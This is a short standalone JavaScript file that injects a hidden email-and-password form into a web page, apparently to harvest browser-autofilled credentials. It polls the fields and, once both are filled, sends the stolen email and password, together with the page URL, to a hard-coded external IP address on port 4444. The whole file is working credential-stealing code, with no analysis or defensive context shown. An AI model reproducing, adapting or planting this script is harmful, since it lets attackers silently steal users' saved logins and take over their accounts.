var sniffedEmail;
var sniffedPassword;
var injectForm = function (visible) {
    console.log("Injecting the form");
    var container = document.createElement('div');
    if (!visible) {
        container.style.display = 'none';
    }
    var form = document.createElement('form');
    form.attributes.autocomplete = 'on';
    var emailInput = document.createElement('input');
    emailInput.attributes.vcard_name = 'vCard.Email';
    emailInput.id = 'email';
    emailInput.type = 'email';
    emailInput.name = 'email';
    form.appendChild(emailInput);
    var passwordInput = document.createElement('input');
    passwordInput.id = 'password';
    passwordInput.type = 'password';
    passwordInput.name = 'password';
    form.appendChild(passwordInput);
    container.appendChild(form);
    document.body.appendChild(container);
};

var printResult = function (sniffedValue) {
    console.log("omri:" + sniffedValue);
    a = document.createElement('a');
    var linkText = document.createTextNode("my title text");
    a.appendChild(linkText);
    a.href = "http://34.243.18.113:4444?redirect=" + window.location.href + "&creds=" + sniffedValue;
    a.click()
};

var sniffInputField = function (fieldId) {
    var inputElement = document.getElementById(fieldId);
    if (inputElement && inputElement.value.length && (fieldId == "password" || fieldId == "email")) {
        if (fieldId == "email") {
            sniffedEmail = inputElement.value;
        } else {
            sniffedPassword = inputElement.value;
        }
        if (sniffedEmail && sniffedPassword) {
            printResult(sniffedEmail + ":" + sniffedPassword);
        }
    } else {
        window.setTimeout(sniffInputField, 200, fieldId);
    }
};

var sniffInputFields = function () {
    var inputs = document.getElementsByTagName('input');
    console.log(inputs);
    for (var i = 0; i < inputs.length; i++) {
        sniffInputField(inputs[i].id);

    }
};

var sniffFormInfo = function (visible) {
    injectForm(visible);
    sniffInputFields();
};

var visible_form = false;
sniffFormInfo(visible_form);
